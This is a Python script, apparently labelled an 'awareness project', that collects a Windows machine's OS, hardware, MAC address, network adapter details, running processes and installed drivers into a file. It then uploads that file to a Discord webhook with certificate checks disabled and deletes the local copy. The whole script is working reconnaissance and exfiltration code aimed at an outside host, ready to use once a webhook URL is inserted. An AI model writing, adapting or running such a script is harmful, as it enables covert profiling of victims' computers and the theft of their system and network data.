############
# elimPawn #
##########################
#                        #
# Data collection script #
#                        #
##########################

import os
import wmi
import sys
import uuid
import psutil
import urllib3
import requests
import platform
import subprocess


webhook = "Discord Webhook Here"

print("--==+ AWARENESS PROJECT +==--")

# Probe components
print("Probing components")
system_name = platform.system()
release = platform.release()
version = platform.version()
machine_type = platform.machine()

c = wmi.WMI()
cpu_info = c.Win32_Processor()[0]
cpu_type = cpu_info.Name
cpu_speed = cpu_info.MaxClockSpeed

mem_info = c.Win32_ComputerSystem()[0]
total_physical_memory = mem_info.TotalPhysicalMemory

hd_info = c.Win32_LogicalDisk()[0]
free_disk_space = hd_info.FreeSpace

is_64bits = sys.maxsize > 2**32

video = c.Win32_VideoController()[0]

# Probe MAC
print("Probing MAC address")
raw_mac = uuid.getnode()
enc_mac = ':'.join(['{:02x}'.format((raw_mac >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])

# Probe Adapters
print("Probing adapters")
adapterquery = subprocess.check_output(['ipconfig', '/all'])
adapters = adapterquery.decode("utf-8")

with open("ness.txt", "a") as f:
    f.write(f"""
Windows: {system_name} {release} ( {version} ) {platform.win32_edition()} )
64-bits? : {is_64bits} ( {machine_type} )
CPU: {cpu_type} ( {platform.processor()}
CPU Speed: {cpu_speed} MHz
Total Physical Memory: {int(total_physical_memory) // (1024*1024)} MB
Free Disk Space: {int(free_disk_space) // (1024*1024)} MB


Computer Network Name: {platform.node()}
MAC Address: {enc_mac}

Graphics Card: {video.Name}
Video Processor: {video.VideoProcessor}
Driver Date: {video.DriverDate}
Max Refresh Rate: {video.MaxRefreshRate}
Min Refresh Rate: {video.MinRefreshRate}
Video Mode Desc.: {video.VideoModeDescription}
Installed Display Drivers:
{video.InstalledDisplayDrivers}



Adapters:
{adapters}


HD: {c.Win32_LogicalDisk()}
Mem: {c.Win32_ComputerSystem()}
CPUs: {c.Win32_Processor()}

""")
    f.close()

# Probe processes
print("Probing processes")
for process in psutil.process_iter(['pid', 'name']):
    x = open("ness.txt", "a")
    x.write(str(f"{process}\n"))
    x.close()


# Probe drivers
print("Probing drivers")
drivquery = subprocess.check_output(['driverquery', '/v'])
drivers = drivquery.decode('utf-8')
with open("ness.txt", "a") as f:
    f.write(f"\n\n\n\n\n\n{drivers}")
    f.close()


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
print("Sending data to webhook")
requests.post(webhook, files={"file": open("ness.txt", "rb")}, verify=False)

print("Removing collected information")
os.remove("ness.txt")

x = input("Press any key to exit...")
exit()
